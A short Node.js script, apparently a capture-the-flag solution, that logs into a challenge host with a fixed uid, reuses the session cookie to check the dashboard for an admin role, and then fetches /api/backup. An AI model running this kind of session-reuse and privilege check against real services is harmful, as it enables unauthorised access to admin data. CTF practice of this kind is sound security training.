
const http = require('http');
const querystring = require('querystring');

const postData = querystring.stringify({
  "uid": "9e5861b088a34b9380c789c735366c77"
});

const options = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/login',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(postData)
  }
};

const req = http.request(options, (res) => {
  let setCookie = res.headers['set-cookie'];
  let cookie = setCookie ? setCookie.map(c => c.split(';')[0]).join('; ') : '';
  getPage('/dashboard', cookie, (body) => {
    console.log("Dashboard output:");
    console.log(body);
    // Check if role is admin
    if (body.includes('admin')) {
      console.log("\n--- Got admin role! Now get backup ---");
      // Find backup link
      getPage('/api/backup', cookie, (backupBody) => {
        console.log("\nBackup response:");
        console.log(backupBody);
      });
    }
  });
});

req.on('error', err => console.error(err));
req.write(postData);
req.end();

function getPage(path, cookie, callback) {
  const options = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: path,
    method: 'GET',
    headers: {
      'Cookie': cookie
    }
  };

  const req = http.request(options, (res) => {
    let body = '';
    res.on('data', chunk => body += chunk);
    res.on('end', () => callback(body));
  });
  req.end();
}
